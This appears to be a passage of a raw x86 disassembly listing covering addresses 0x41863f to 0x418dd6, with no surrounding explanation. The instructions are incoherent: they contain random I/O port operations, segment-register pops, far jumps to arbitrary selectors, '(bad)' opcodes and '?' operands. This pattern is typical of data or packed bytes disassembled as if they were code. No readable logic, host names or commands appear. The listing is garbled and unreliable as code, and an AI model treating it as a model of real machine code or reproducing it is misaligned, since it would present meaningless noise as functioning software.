  41863f:	outs   dx,DWORD PTR ds:[esi]
  418640:	jb     0x418643
  418642:	xchg   ecx,ebp
  418644:	div    edi
  418646:	arpl   WORD PTR [edx],cx
  418648:	sbb    dh,dl
  41864a:	adc    al,0xf5
  41864c:	gs dec ebp
  41864e:	xchg   ebx,eax
  41864f:	retf   0x4802
  418652:	mov    bl,0x60
  418654:	mov    ds:0xef8e8b26,al
  418659:	add    eax,0x9cf9f744
  41865e:	jecxz  0x4186b2
  418660:	mov    edx,0x64830cab
  418665:	in     al,0x4f
  418667:	inc    esi
  418668:	add    DWORD PTR [ebp+0x644d1b20],edx
  41866e:	push   esi
  41866f:	push   esp
  418670:	ins    BYTE PTR es:[edi],dx
  418671:	jo     0x4186e5
  418673:	cmp    BYTE PTR [ecx],cl
  418675:	push   0x22
  418677:	pop    ss
  418678:	popf   
  418679:	ret    0x8a82
  41867c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41867d:	mov    ebp,0x9ff89453
  418682:	mov    al,0xf3
  418684:	and    BYTE PTR [esi+ebx*1+0x4c],dh
  418688:	and    DWORD PTR ds:0x833fd4a8,esi
  41868e:	cmp    ecx,DWORD PTR [esi-0x42]
  418691:	ja     0x41862e
  418693:	js     0x418643
  418695:	jle    0x41865c
  418697:	sub    dl,BYTE PTR [ebp-0x6d]
  41869a:	ins    BYTE PTR es:[edi],dx
  41869b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41869c:	push   ds
  41869d:	arpl   dx,cx
  41869f:	push   cs
  4186a0:	or     BYTE PTR [ecx-0xf4b5000],ch
  4186a6:	sbb    eax,0xdd87dc20
  4186ab:	or     DWORD PTR [ecx+0x17],ebp
  4186ae:	sbb    al,0xe0
  4186b0:	mov    eax,ds:0x39733705
  4186b5:	jb     0x4186d7
  4186b7:	sub    ebx,DWORD PTR [esi-0x4]
  4186ba:	stc    
  4186bb:	mov    BYTE PTR [edx],dl
  4186bd:	mov    WORD PTR [edx+0x30ac1b63],es
  4186c3:	inc    edx
  4186c4:	imul   esp,DWORD PTR [ebx+0x1eaf7f81],0x9c164427
  4186ce:	int3   
  4186cf:	sbb    al,0xc5
  4186d1:	push   edi
  4186d2:	sti    
  4186d3:	ficom  DWORD PTR es:[esi-0x7e5b330d]
  4186da:	jnp    0x4186e5
  4186dc:	(bad)
  4186df:	mov    es,WORD PTR [esi]
  4186e1:	lea    ebp,[edi+0x489fa10]
  4186e7:	push   es
  4186e8:	das    
  4186e9:	loopne 0x418745
  4186eb:	int    0xee
  4186ed:	stos   BYTE PTR es:[edi],al
  4186ee:	fldenv [ebx+0x72]
  4186f1:	pcmpgtd mm5,QWORD PTR [edx+eiz*4]
  4186f5:	int3   
  4186f6:	loopne 0x418741
  4186f8:	cli    
  4186f9:	rcr    DWORD PTR [esi+0x10],1
  4186fc:	inc    esp
  4186fd:	loopne 0x4186c3
  4186ff:	xlat   BYTE PTR ds:[ebx]
  418700:	jmp    0x4186c6
  418702:	mov    eax,ds:0xa7421b2b
  418707:	out    dx,al
  418708:	jno    0x41869f
  41870a:	add    ebx,edi
  41870c:	test   DWORD PTR [edi],edi
  41870e:	push   eax
  41870f:	add    BYTE PTR [ebx-0x41cec9c8],0x8b
  418716:	jl     0x41869b
  418718:	xchg   esi,eax
  418719:	stos   BYTE PTR es:[edi],al
  41871a:	adc    edi,DWORD PTR [ebp-0x2d]
  41871d:	ret    
  41871e:	sti    
  41871f:	inc    esi
  418720:	jecxz  0x418730
  418722:	pop    ds
  418723:	mov    dh,0xf6
  418725:	mov    cl,0xe
  418727:	pop    es
  418728:	inc    ecx
  418729:	scas   eax,DWORD PTR es:[edi]
  41872a:	sub    ah,BYTE PTR [edi]
  41872c:	imul   ebx,DWORD PTR [esi-0x35],0x36554772
  418733:	inc    edi
  418734:	jnp    0x41876f
  418736:	cs mov eax,0xf2cb548c
  41873c:	popa   
  41873d:	nop
  41873e:	jmp    0x13a6e515
  418743:	fst    QWORD PTR [esi]
  418745:	std    
  418746:	dec    edi
  418747:	adc    eax,0x2d9545e4
  41874c:	xlat   BYTE PTR ds:[ebx]
  41874d:	pop    ecx
  41874e:	mov    edx,0xcf130be4
  418753:	mov    dh,0xfa
  418755:	pop    ebx
  418756:	into   
  418757:	or     al,0xb4
  418759:	adc    al,0x6d
  41875b:	(bad)  
  41875c:	push   eax
  41875d:	pop    ds
  41875e:	xor    eax,0xef986201
  418763:	ret    
  418764:	jbe    0x41876f
  418766:	or     eax,0xcdf255a8
  41876b:	jmp    0xe78f:0xea9d61d7
  418772:	dec    ebp
  418773:	jecxz  0x4187d9
  418775:	in     al,0x59
  418777:	jbe    0x41874b
  418779:	das    
  41877a:	cdq    
  41877b:	inc    edi
  41877c:	mov    al,0xf8
  41877e:	inc    ecx
  41877f:	mov    edi,0xf0e628a5
  418784:	std    
  418785:	inc    eax
  418786:	mov    ah,0xe2
  418788:	xchg   esp,eax
  418789:	jecxz  0x418729
  41878b:	cmp    al,0x69
  41878d:	jle    0x418754
  41878f:	(bad)  
  418790:	cmp    edi,esp
  418792:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418793:	(bad)  
  418794:	fild   WORD PTR [esi+0x2e]
  418797:	cmp    DWORD PTR [ebx],esp
  418799:	mov    BYTE PTR [edi+0x4623f4cd],bl
  41879f:	test   eax,0xa1428a46
  4187a4:	and    cl,BYTE PTR [ebp+0x61]
  4187a7:	fwait
  4187a8:	aaa    
  4187a9:	mov    ecx,0xb4399a28
  4187ae:	je     0x4187f5
  4187b0:	aaa    
  4187b1:	sub    DWORD PTR fs:[esi+0x64],ecx
  4187b5:	lock push ebp
  4187b7:	std    
  4187b8:	sub    DWORD PTR [edi+0x1e],ebx
  4187bb:	jg     0x41878b
  4187bd:	fucomi st,st(5)
  4187bf:	shr    BYTE PTR [edi-0x2d7b4dc1],cl
  4187c5:	adc    al,0x4d
  4187c7:	and    eax,0x62676ddc
  4187cc:	and    dh,BYTE PTR [ebx-0x4dfd67f6]
  4187d2:	pop    ebp
  4187d3:	sub    BYTE PTR [esi],bh
  4187d5:	push   ecx
  4187d6:	or     DWORD PTR ds:0x930d3f6c,ebx
  4187dc:	dec    esi
  4187dd:	xchg   edx,eax
  4187de:	mov    ds:0xe2c4411d,eax
  4187e3:	leave  
  4187e4:	jp     0x418824
  4187e6:	mov    dl,0x18
  4187e8:	lods   eax,DWORD PTR ds:[esi]
  4187e9:	aam    0xee
  4187eb:	scas   al,BYTE PTR es:[edi]
  4187ec:	jo     0x41885c
  4187ee:	xor    al,0x7f
  4187f0:	add    dh,dl
  4187f2:	and    DWORD PTR [edi-0x5c],ebx
  4187f5:	enter  0xbca9,0x81
  4187f9:	or     DWORD PTR [edi-0x111fe8e0],esp
  4187ff:	int3   
  418800:	das    
  418801:	jbe    0x418801
  418803:	add    eax,0x192a9669
  418808:	add    eax,0xb8ded9a1
  41880d:	ja     0x418824
  41880f:	sbb    al,0x73
  418811:	jmp    0x2ae2:0x1675a3ed
  418818:	imul   esp,ebp,0xffffff94
  41881b:	test   esi,0x9f75a398
  418821:	or     edx,DWORD PTR [edi]
  418823:	retf   0x7cd5
  418826:	daa    
  418827:	push   esp
  418828:	adc    DWORD PTR [ecx+ecx*2+0x4442e4e7],edi
  41882f:	cwde   
  418830:	dec    esp
  418831:	cwde   
  418832:	or     DWORD PTR [ecx+0x73],ebp
  418835:	fidiv  DWORD PTR ds:0x1c7fae2d
  41883b:	sub    ecx,DWORD PTR [ebx+0x4f]
  41883e:	and    eax,0xaf3f0f20
  418843:	pushf  
  418844:	adc    edx,esp
  418846:	call   0xe696:0x1ce3b76e
  41884d:	pop    ecx
  41884e:	xchg   ecx,eax
  41884f:	mov    edx,0x37984409
  418854:	or     ah,BYTE PTR ss:[edi-0x785c8dea]
  41885b:	push   ebx
  41885c:	in     eax,dx
  41885d:	pop    ss
  41885e:	pop    ss
  41885f:	sub    dl,BYTE PTR [edi+0x14]
  418862:	jne    0x41883c
  418864:	vdivpd xmm7,xmm4,XMMWORD PTR [edi-0x47568348]
  41886c:	retf   0x770
  41886f:	dec    ebx
  418870:	stos   BYTE PTR es:[edi],al
  418871:	hlt    
  418872:	inc    eax
  418873:	ret    0x6c5
  418876:	test   BYTE PTR [esi],bl
  418878:	enter  0x28f,0x4
  41887c:	sub    ebx,DWORD PTR [ebp-0x276fbffa]
  418882:	lods   eax,DWORD PTR ds:[esi]
  418883:	test   BYTE PTR [esi+0xe68365a],bl
  418889:	sbb    edx,0xffffffae
  41888c:	or     cl,dl
  41888e:	fnstsw WORD PTR [esi]
  418890:	or     BYTE PTR [ebx],0x97
  418893:	daa    
  418894:	shl    BYTE PTR [ecx-0x9fa3de6],0x12
  41889b:	mov    esp,0x88e1d60b
  4188a0:	sbb    DWORD PTR [esi],ebp
  4188a2:	sbb    DWORD PTR [esi],0xc739004a
  4188a8:	adc    DWORD PTR [ecx+ebp*8],edi
  4188ab:	je     0x418916
  4188ad:	mov    edx,DWORD PTR [eax]
  4188af:	cld    
  4188b0:	ins    DWORD PTR es:[edi],dx
  4188b1:	adc    eax,0x8cf0daed
  4188b6:	mov    dl,0xe6
  4188b8:	pminub mm3,mm6
  4188bb:	xor    BYTE PTR [edx],0x3e
  4188be:	xchg   esp,eax
  4188bf:	jl     0x4188b0
  4188c1:	or     ch,BYTE PTR [ebp+0x42]
  4188c4:	adc    esi,DWORD PTR [edx-0x15]
  4188c7:	int3   
  4188c8:	fs push 0x1338aaaa
  4188ce:	in     eax,dx
  4188cf:	add    eax,0x6658754c
  4188d4:	mov    cl,0x9f
  4188d6:	out    0xf6,eax
  4188d8:	stc    
  4188d9:	in     eax,dx
  4188da:	call   0x3f816814
  4188df:	add    esp,esp
  4188e1:	xchg   BYTE PTR [ebx-0x74],bl
  4188e4:	mov    edx,0xa18a345f
  4188e9:	bound  ebx,QWORD PTR [ecx+0x27]
  4188ec:	push   esi
  4188ed:	lods   eax,DWORD PTR ds:[esi]
  4188ee:	js     0x4188d0
  4188f0:	push   0x32c1d7a2
  4188f5:	aam    0x4f
  4188f7:	ins    DWORD PTR es:[edi],dx
  4188f8:	je     0x4188d0
  4188fa:	fs in  al,dx
  4188fc:	out    dx,eax
  4188fd:	cmp    ecx,DWORD PTR [ecx-0x5d3d0ac0]
  418903:	or     DWORD PTR [ecx],esi
  418905:	mov    ebx,0xe2dc6d25
  41890a:	xchg   ecx,eax
  41890b:	out    dx,al
  41890c:	pop    ds
  41890d:	ins    DWORD PTR es:[edi],dx
  41890e:	out    dx,eax
  41890f:	out    dx,eax
  418910:	not    cl
  418912:	mov    al,ds:0x844f6603
  418917:	ja     0x41896c
  418919:	cmp    BYTE PTR [ebx-0x34c86de9],dl
  41891f:	jbe    0x41890d
  418921:	iret   
  418922:	stos   BYTE PTR es:[edi],al
  418923:	pop    edx
  418924:	sti    
  418925:	jb     0x4188c3
  418927:	inc    ebp
  418928:	jbe    0x41891b
  41892a:	pushf  
  41892b:	or     eax,0xa09e516f
  418930:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418931:	xor    DWORD PTR [edx-0x3],esi
  418934:	sbb    bl,BYTE PTR [ebx]
  418936:	xlat   BYTE PTR ds:[ebx]
  418937:	add    eax,0x41ba95c8
  41893c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41893d:	pop    es
  41893e:	xchg   ebp,eax
  41893f:	popa   
  418940:	mov    edi,0xd65c8323
  418945:	push   edx
  418946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418947:	addr16 aad 0xfa
  41894a:	jg     0x418964
  41894c:	mov    dh,0x90
  41894e:	pop    esi
  41894f:	push   ss
  418950:	sti    
  418951:	jne    0x41898c
  418953:	cmp    DWORD PTR [edx-0x69],ecx
  418956:	pop    ss
  418957:	mov    ebx,0x4309e407
  41895c:	lds    ecx,FWORD PTR [ecx+0x75]
  41895f:	mov    esp,?
  418961:	imul   ecx,DWORD PTR [esi+0x61],0x931b9cfc
  418968:	into   
  418969:	pushf  
  41896a:	fcmovu st,st(0)
  41896c:	imul   esi,DWORD PTR [edi],0xbe65c755
  418972:	ja     0x418964
  418974:	mov    eax,DWORD PTR [eax+0x10a7cd83]
  41897a:	nop
  41897b:	test   esp,ecx
  41897d:	pop    es
  41897e:	push   0x4c21a08c
  418983:	mov    ds:0x66e6b48c,eax
  418988:	sub    al,0xdd
  41898a:	por    mm2,mm1
  41898d:	mov    ecx,edx
  41898f:	jmp    0x418913
  418991:	outs   dx,DWORD PTR ds:[esi]
  418992:	sub    ch,BYTE PTR [ebx]
  418994:	sti    
  418995:	mov    al,ds:0x2461a069
  41899a:	cmp    bh,BYTE PTR [ebx+0x20]
  41899d:	fbld   TBYTE PTR ds:0xef6be8ac
  4189a3:	fdiv   QWORD PTR [edx]
  4189a5:	pop    edx
  4189a6:	pop    ss
  4189a7:	jecxz  0x4189ea
  4189a9:	and    dh,BYTE PTR [esi+ecx*8]
  4189ac:	aas    
  4189ad:	adc    al,0x25
  4189af:	call   0xce92e2b1
  4189b4:	ficom  DWORD PTR [edx+0x24]
  4189b8:	repz adc al,0xe2
  4189bb:	dec    esi
  4189bc:	inc    ebp
  4189bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4189be:	add    al,0xdc
  4189c0:	jno    0x418a27
  4189c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189c3:	and    al,0x4
  4189c5:	pop    ds
  4189c6:	ja     0x418995
  4189c8:	xchg   ebp,eax
  4189c9:	xor    eax,0xb4e8714
  4189ce:	(bad)  
  4189cf:	leave  
  4189d0:	fnstsw WORD PTR [edi+0x6182813e]
  4189d6:	jmp    0xbf910d9f
  4189db:	mov    eax,DWORD PTR [ebp+eax*2-0x48]
  4189df:	add    bh,dh
  4189e1:	sub    ecx,esi
  4189e3:	push   eax
  4189e4:	fwait
  4189e5:	out    dx,eax
  4189e6:	fsubr  DWORD PTR [eax]
  4189e8:	mov    eax,ds:0xd6bce51e
  4189ed:	sbb    eax,0x33ab0503
  4189f2:	das    
  4189f3:	or     ebx,ebx
  4189f5:	jmp    DWORD PTR [esi]
  4189f7:	sub    BYTE PTR [ebx],ch
  4189f9:	and    eax,0xc538897b
  4189fe:	ss inc esi
  418a00:	mov    dh,BYTE PTR [edi+0x59]
  418a03:	mov    ds,edx
  418a05:	xchg   edi,eax
  418a06:	add    al,0x84
  418a08:	leave  
  418a09:	sub    DWORD PTR [eax+eax*4-0x5c7acca9],0x5f
  418a11:	(bad)  
  418a12:	loopne 0x418a27
  418a14:	push   0xa97ff2d2
  418a19:	fwait
  418a1a:	std    
  418a1b:	inc    ebx
  418a1c:	jp     0x418a79
  418a1e:	jne    0x4189b7
  418a20:	rol    BYTE PTR [ecx+0x7c],cl
  418a23:	sbb    al,0x20
  418a25:	push   ecx
  418a26:	loopne 0x418a53
  418a28:	sub    al,0xdc
  418a2a:	out    0x4f,al
  418a2c:	cmp    al,0xcb
  418a2e:	hlt    
  418a2f:	int3   
  418a30:	lods   eax,DWORD PTR ds:[esi]
  418a31:	pop    edx
  418a32:	ficom  WORD PTR [edx+edx*2+0x68]
  418a36:	(bad)  
  418a37:	cli    
  418a38:	mov    eax,0x4f7fd02b
  418a3d:	sub    dl,BYTE PTR [esi]
  418a3f:	jno    0x418a2a
  418a41:	rcl    DWORD PTR [eax-0x51fa8d9d],cl
  418a47:	fiadd  WORD PTR [edi-0x22]
  418a4a:	lods   al,BYTE PTR ds:[esi]
  418a4b:	xchg   ecx,eax
  418a4c:	cmp    ecx,ebp
  418a4e:	ret    
  418a4f:	inc    edx
  418a50:	sahf   
  418a51:	inc    esi
  418a52:	lods   al,BYTE PTR ds:[esi]
  418a53:	aas    
  418a54:	mov    bh,0xa5
  418a56:	das    
  418a57:	mov    esi,esi
  418a59:	test   BYTE PTR [edx-0x5b],ah
  418a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a5d:	out    dx,eax
  418a5e:	fstp   QWORD PTR [esp+edi*1+0x34]
  418a62:	cdq    
  418a63:	xchg   ebx,eax
  418a64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418a65:	ret    
  418a66:	imul   ebp,DWORD PTR [edi+0x7cdfec7d],0x4ecb956a
  418a70:	push   ss
  418a71:	mov    esp,0x891866d3
  418a76:	icebp  
  418a77:	stos   BYTE PTR es:[edi],al
  418a78:	jge    0x418ab0
  418a7a:	jo     0x418a20
  418a7c:	fsubr  QWORD PTR [eax+0x420d04e3]
  418a82:	test   al,0x90
  418a84:	mov    ds:0x11b0ead8,al
  418a89:	sti    
  418a8a:	or     al,0x52
  418a8c:	sbb    ecx,DWORD PTR [edi-0x59538345]
  418a92:	push   cs
  418a93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418a95:	xchg   esi,eax
  418a96:	stos   DWORD PTR es:[edi],eax
  418a97:	pop    ebx
  418a98:	mov    esp,0xff3531bb
  418a9d:	loop   0x418afa
  418a9f:	in     eax,0x98
  418aa1:	push   cs
  418aa2:	sbb    ecx,DWORD PTR [eax-0x5b]
  418aa5:	repnz shr DWORD PTR [esi+eiz*8],cl
  418aa9:	stos   DWORD PTR es:[edi],eax
  418aaa:	clc    
  418aab:	pop    ds
  418aac:	xor    BYTE PTR [ecx+eiz*1-0x3f],al
  418ab0:	jg     0x418ae8
  418ab2:	jecxz  0x418a80
  418ab4:	sub    BYTE PTR [esi],dh
  418ab6:	jg     0x418a6f
  418ab8:	pop    esi
  418ab9:	and    bh,BYTE PTR [edx]
  418abb:	lea    ebx,[eax-0x5686e6da]
  418ac1:	inc    edx
  418ac2:	int    0xf2
  418ac4:	add    bh,BYTE PTR [edi-0x12]
  418ac7:	xchg   esp,eax
  418ac8:	out    0x94,eax
  418aca:	push   ecx
  418acb:	push   0x8003332b
  418ad0:	call   0xd2e5:0xffbe9ba
  418ad7:	lock aad 0xd1
  418ada:	xchg   ebx,eax
  418adb:	push   ds
  418adc:	mov    ch,0xec
  418ade:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418adf:	es push esp
  418ae1:	fsub   QWORD PTR [ebp+0x46]
  418ae4:	pop    edx
  418ae5:	mov    edi,0x665c6725
  418aea:	fwait
  418aeb:	cmp    al,0x69
  418aed:	add    BYTE PTR [edx+0x589d170e],dh
  418af3:	xor    BYTE PTR [esi],dl
  418af5:	call   DWORD PTR [ecx-0x38c2ddef]
  418afb:	push   ecx
  418afc:	sub    BYTE PTR [ecx-0x41],dh
  418aff:	ins    BYTE PTR es:[edi],dx
  418b00:	pop    ecx
  418b01:	stos   BYTE PTR es:[edi],al
  418b02:	mov    ds:0x6bbb58f3,al
  418b07:	mov    ?,ecx
  418b09:	adc    dh,BYTE PTR [ebx-0x20628ae8]
  418b0f:	mov    al,0xaa
  418b11:	add    edi,edx
  418b13:	inc    eax
  418b14:	adc    eax,0xb15669c8
  418b19:	loopne 0x418aa1
  418b1b:	mov    bl,0x7f
  418b1d:	aam    0x47
  418b1f:	ss push edi
  418b21:	les    ecx,FWORD PTR [edi-0x52]
  418b24:	cmp    eax,0x355f1345
  418b29:	outs   dx,DWORD PTR ds:[esi]
  418b2a:	retf   
  418b2b:	mov    edi,0x3f80e196
  418b30:	xchg   edi,eax
  418b31:	scas   al,BYTE PTR es:[edi]
  418b32:	ss add cl,bl
  418b35:	xchg   BYTE PTR [edi+0x79],ah
  418b38:	pop    ss
  418b39:	iret   
  418b3a:	mov    bh,0xca
  418b3c:	test   al,0xb4
  418b3e:	scas   al,BYTE PTR es:[edi]
  418b3f:	jmp    DWORD PTR ds:0xa2a2e0de
  418b45:	inc    eax
  418b46:	ror    edi,cl
  418b48:	es sbb edx,DWORD PTR fs:[edx-0x40]
  418b4d:	dec    esi
  418b4e:	jl     0x418b86
  418b50:	push   cs
  418b51:	add    esp,DWORD PTR [eax]
  418b53:	ret    
  418b54:	cwde   
  418b55:	pop    DWORD PTR [edx-0x6995351f]
  418b5b:	cmp    ax,0x2e51
  418b5f:	push   ds
  418b60:	adc    bh,dh
  418b62:	push   eax
  418b63:	out    0x93,al
  418b65:	add    al,0xb9
  418b67:	aam    0xfd
  418b69:	inc    ecx
  418b6a:	faddp  st(2),st
  418b6c:	add    eax,0x71191239
  418b71:	aam    0xa2
  418b73:	sbb    eax,0x7ba5aca6
  418b78:	fwait
  418b79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b7a:	push   ecx
  418b7b:	adc    DWORD PTR [ebx-0x720e8bf5],0xffffffb2
  418b82:	iret   
  418b83:	mov    ecx,0x49dbad7f
  418b88:	mov    ch,0x9
  418b8a:	and    eax,DWORD PTR ds:0x57adcbed
  418b90:	push   ebx
  418b91:	mov    BYTE PTR [edx-0x801d720],bh
  418b97:	loope  0x418b8d
  418b99:	xchg   edi,eax
  418b9a:	cmp    al,0xd3
  418b9c:	sub    al,0x71
  418b9e:	imul   ecx,eax,0x42e2a377
  418ba4:	bound  eax,QWORD PTR [esi+ebp*4+0x7b]
  418ba8:	out    dx,eax
  418ba9:	sbb    BYTE PTR [edx],ah
  418bab:	push   esp
  418bac:	sub    ebp,edi
  418bae:	mov    esi,esi
  418bb0:	pop    esp
  418bb1:	mov    ds:0x102738b0,eax
  418bb6:	pop    ds
  418bb7:	outs   dx,BYTE PTR ds:[esi]
  418bb8:	loope  0x418bea
  418bba:	gs mov ecx,0x1000f8d1
  418bc0:	dec    edx
  418bc1:	in     al,0xf2
  418bc3:	xor    eax,0xefd240b1
  418bc8:	jno    0x418bee
  418bca:	lods   al,BYTE PTR ds:[esi]
  418bcb:	in     eax,0x26
  418bcd:	pop    esp
  418bce:	in     eax,dx
  418bcf:	mov    bl,0x63
  418bd1:	icebp  
  418bd2:	fistp  QWORD PTR [eax+0x72]
  418bd5:	pop    edx
  418bd6:	xchg   esi,eax
  418bd7:	inc    BYTE PTR [ebp-0x2d]
  418bda:	jnp    0x418c26
  418bdc:	pop    es
  418bdd:	pop    edi
  418bde:	pushf  
  418bdf:	jg     0x418c0d
  418be1:	icebp  
  418be2:	add    DWORD PTR [eax+0x4c],esp
  418be5:	ss xchg esp,eax
  418be7:	jb     0x418b89
  418be9:	stc    
  418bea:	inc    edx
  418beb:	cmp    dh,BYTE PTR [esp+eax*4-0x3f]
  418bef:	adc    BYTE PTR [ebx],dh
  418bf1:	rcl    DWORD PTR [esi+0x54],cl
  418bf4:	jge    0x418bcf
  418bf6:	mov    dh,0x49
  418bf8:	pop    es
  418bf9:	clc    
  418bfa:	popf   
  418bfb:	xor    DWORD PTR [eax+edx*8+0x3ba3ee33],edi
  418c02:	or     edx,DWORD PTR [edi]
  418c04:	pop    es
  418c05:	(bad)  
  418c07:	dec    ebp
  418c08:	ja     0x418c12
  418c0a:	sbb    BYTE PTR [edi+0x590884a1],cl
  418c10:	mov    es,WORD PTR [esi+0x6d]
  418c13:	and    eax,0x69a2d313
  418c18:	mov    esp,0xcca7f963
  418c1d:	ror    BYTE PTR fs:[edx-0x7dcf59fc],1
  418c24:	cmp    BYTE PTR [ebp+0x71e7c2c0],ch
  418c2a:	or     al,0xa2
  418c2c:	(bad)  
  418c2e:	imul   edi,DWORD PTR [edi+eax*8-0x63d088e4],0x3d3f3730
  418c39:	in     eax,dx
  418c3a:	(bad)  [esi]
  418c3c:	mov    cl,0x5d
  418c3e:	mov    eax,0x3277e79b
  418c43:	rol    DWORD PTR [ecx+0x58],1
  418c46:	aad    0xef
  418c48:	lahf   
  418c49:	add    esp,edi
  418c4b:	xor    DWORD PTR [eax+0xe42b67d],eax
  418c51:	xchg   esp,eax
  418c52:	cmp    BYTE PTR [edx+0x7e],bl
  418c55:	dec    edx
  418c56:	(bad)  
  418c57:	in     al,0x37
  418c59:	test   al,0x4a
  418c5b:	repnz sbb DWORD PTR [eax-0x39268b12],eax
  418c62:	jo     0x418c2f
  418c64:	mov    cl,0x3
  418c66:	(bad)  
  418c67:	aad    0x41
  418c69:	xchg   DWORD PTR [ebx-0x569e3eac],edi
  418c6f:	push   0xffffff85
  418c71:	addr16 xor eax,0x5b2d8bf7
  418c77:	inc    ecx
  418c78:	cmp    al,dh
  418c7a:	rcl    BYTE PTR [ebp+esi*4+0x23],cl
  418c7e:	jmp    FWORD PTR [esp+eiz*8-0x7b0af42c]
  418c85:	inc    ebx
  418c86:	add    DWORD PTR [esi-0x6c],ebp
  418c89:	jo     0x418c2c
  418c8b:	repz dec ecx
  418c8d:	dec    ecx
  418c8e:	cmc    
  418c8f:	outs   dx,DWORD PTR ds:[esi]
  418c90:	adc    BYTE PTR ds:0xbf3ae081,dh
  418c96:	xor    BYTE PTR [esi-0xd268ed4],bh
  418c9c:	lods   eax,DWORD PTR ds:[esi]
  418c9d:	in     al,0xaf
  418c9f:	or     BYTE PTR [edx-0x791c5ece],bl
  418ca5:	inc    ecx
  418ca6:	xchg   esp,eax
  418ca7:	ret    
  418ca8:	imul   ecx,ebx,0x35d5c880
  418cae:	mov    al,ds:0x9eeece71
  418cb3:	loopne 0x418cdf
  418cb5:	shl    BYTE PTR [ecx+0x4b],cl
  418cb8:	hlt    
  418cb9:	sub    eax,0x597ff062
  418cbe:	(bad)  
  418cbf:	scas   eax,DWORD PTR es:[edi]
  418cc0:	mov    al,0xa3
  418cc2:	mov    al,0x33
  418cc4:	icebp  
  418cc5:	push   0xffffffc9
  418cc7:	push   ds
  418cc8:	mov    bh,0xdf
  418cca:	lods   al,BYTE PTR ds:[esi]
  418ccb:	sahf   
  418ccc:	adc    BYTE PTR [ecx+esi*2+0x1e],al
  418cd0:	push   esi
  418cd1:	outs   dx,BYTE PTR ds:[esi]
  418cd2:	lods   al,BYTE PTR ds:[esi]
  418cd3:	pop    edi
  418cd4:	loop   0x418c90
  418cd6:	(bad)  
  418cd7:	jno    0x418cb7
  418cd9:	rcr    BYTE PTR [esi+0x3a],cl
  418cdc:	jne    0x418c5f
  418cde:	dec    esp
  418cdf:	dec    ebp
  418ce0:	xchg   edi,eax
  418ce1:	or     DWORD PTR [eax],ecx
  418ce3:	in     al,dx
  418ce4:	jbe    0x418cbe
  418ce6:	sub    eax,esi
  418ce8:	xchg   esp,eax
  418ce9:	pop    ecx
  418cea:	sub    BYTE PTR [eax-0x476c22dd],0x13
  418cf1:	and    ah,BYTE PTR [esi]
  418cf3:	add    edx,esp
  418cf5:	ficom  WORD PTR [ebp-0x66]
  418cf8:	clc    
  418cf9:	add    BYTE PTR [edi-0x11],bl
  418cfc:	fadd   st(4),st
  418cfe:	inc    edx
  418cff:	into   
  418d00:	sub    DWORD PTR [esi],edx
  418d02:	pop    ebx
  418d03:	test   DWORD PTR [esi],ebx
  418d05:	adc    BYTE PTR [edi],dl
  418d07:	es sub ecx,0x8bc07545
  418d0e:	pop    ss
  418d0f:	adc    ah,BYTE PTR [edx]
  418d11:	inc    ebx
  418d12:	daa    
  418d13:	(bad)  
  418d15:	jmp    0x1f2c:0x82827b4d
  418d1c:	daa    
  418d1d:	mov    esi,0x66723a8c
  418d22:	cmc    
  418d23:	cmp    eax,0x7614da94
  418d28:	sub    al,0xf2
  418d2a:	fnsave [esi+ebx*4-0x794c6c78]
  418d31:	push   es
  418d32:	jb     0x418d7d
  418d34:	fcom   DWORD PTR [eax]
  418d36:	push   esi
  418d37:	and    dl,BYTE PTR cs:[ecx+0x188cf5bd]
  418d3e:	cdq    
  418d3f:	shl    BYTE PTR [ebx+0x18097bb7],cl
  418d45:	push   es
  418d46:	sar    cx,1
  418d49:	and    bh,BYTE PTR [edi-0xf2aff43]
  418d4f:	mov    ch,0x6c
  418d51:	idiv   BYTE PTR [esi]
  418d53:	mov    ds:0xed0bb02a,al
  418d58:	loopne 0x418da3
  418d5a:	xchg   edi,eax
  418d5b:	int    0x96
  418d5d:	cmp    DWORD PTR [ebx-0x65],edx
  418d60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d61:	das    
  418d62:	mov    eax,ds:0xe3659d0e
  418d67:	loop   0x418d9f
  418d69:	mov    ch,0xc1
  418d6b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418d6c:	scas   eax,DWORD PTR es:[edi]
  418d6d:	jb     0x418d2a
  418d6f:	mov    ch,dl
  418d71:	inc    ebp
  418d72:	jp     0x418dab
  418d74:	jge    0x418dd1
  418d76:	dec    esp
  418d77:	mov    eax,es
  418d79:	dec    edx
  418d7a:	pushf  
  418d7b:	inc    esi
  418d7c:	sti    
  418d7d:	cmc    
  418d7e:	cmp    al,0xe6
  418d80:	fadd   DWORD PTR [ecx]
  418d82:	dec    ebx
  418d83:	ret    
  418d84:	test   eax,0xb14ee210
  418d89:	fnstenv [edx-0x232965cb]
  418d8f:	imul   edx,DWORD PTR [ebp+0x65],0xb44936aa
  418d96:	push   ecx
  418d97:	mov    al,ds:0x2427ec3d
  418d9c:	rcl    BYTE PTR [esi-0x3b],1
  418d9f:	mov    ecx,0x6e1d00f8
  418da4:	jg     0x418dc1
  418da6:	dec    edi
  418da7:	mov    ah,0xdf
  418da9:	jnp    0x418d4c
  418dab:	mov    DWORD PTR [eax],0x34d7c001
  418db1:	pop    es
  418db2:	call   0x7bd:0x1f1cbcf
  418db9:	js     0x418d9b
  418dbb:	data16 fsub QWORD PTR [edi]
  418dbe:	jne    0x418de9
  418dc0:	repz pop edi
  418dc2:	icebp  
  418dc3:	out    dx,al
  418dc4:	inc    edi
  418dc5:	pop    eax
  418dc6:	dec    eax
  418dc7:	loopne 0x418d9e
  418dc9:	adc    DWORD PTR [eax-0x4602ffaa],ebp
  418dcf:	xchg   ebp,eax
  418dd0:	loopne 0x418dbe
  418dd2:	jno    0x418da8
  418dd4:	ss lahf 
  418dd6:	out    dx,eax
